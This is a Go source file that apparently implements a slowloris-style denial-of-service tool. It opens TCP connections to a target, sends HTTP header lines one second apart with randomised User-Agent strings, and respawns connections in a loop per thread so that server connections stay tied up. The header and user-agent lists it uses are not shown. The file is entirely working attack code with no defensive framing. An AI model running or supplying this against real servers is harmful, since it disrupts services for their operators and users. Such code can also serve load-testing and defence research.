package main

import (
	"net"
	"os"
	"fmt"
	"io/ioutil"
	"time"
)

func keepAlive(conn *net.TCPConn, addr string, port string, limit int, thread int, info string) {
	_, err := conn.Write([]byte(info))
	checkNetError(conn, addr, port, limit, thread, err)
	time.Sleep(time.Second * 1)
}

func SpawnSocket(addr string, port string, limit int, thread int) {
	combinedAddr := addr + ":" + port
	tcpAddr, err := net.ResolveTCPAddr("tcp4", combinedAddr)
	checkError(err)
	conn, err := net.DialTCP("tcp", nil, tcpAddr)
	checkNetError(conn, addr, port, limit, thread, err)
	conn.SetKeepAlive(true)
	for i := 0; i < len(headers); i++ {
		keepAlive(conn, addr, port, limit, thread, headers[i])
	}
	userAgent := "User-Agent: " + userAgents[random(0, 25)]
	keepAlive(conn, addr, port, limit, thread, userAgent)
	host := "Host: " + addr + "\r\n\r\n"
	keepAlive(conn, addr, port, limit, thread, host)
	_, err = ioutil.ReadAll(conn)
	checkError(err)
	conn.Close()
}

func OpenSocket(addr string, port string, limit int, thread int) {
	fmt.Printf("Thread #%v open...\n", thread)
	totalReqs := 0
	for totalReqs <= limit {
		SpawnSocket(addr, port, limit, thread)
		totalReqs += 1
		if totalReqs > limit {
			fmt.Printf("Thread #%v done.\n", thread)
		} else {
			fmt.Printf("Respawning new connection on thread #%v...\n", thread)
		}
	}
}

func checkNetError(conn *net.TCPConn, addr string, port string, limit int, thread int, err error) {
    if err != nil {
		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
		conn.Close()
		OpenSocket(addr, port, limit, thread)
    }
}

func checkError(err error) {
    if err != nil {
		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
        os.Exit(1)
    }
}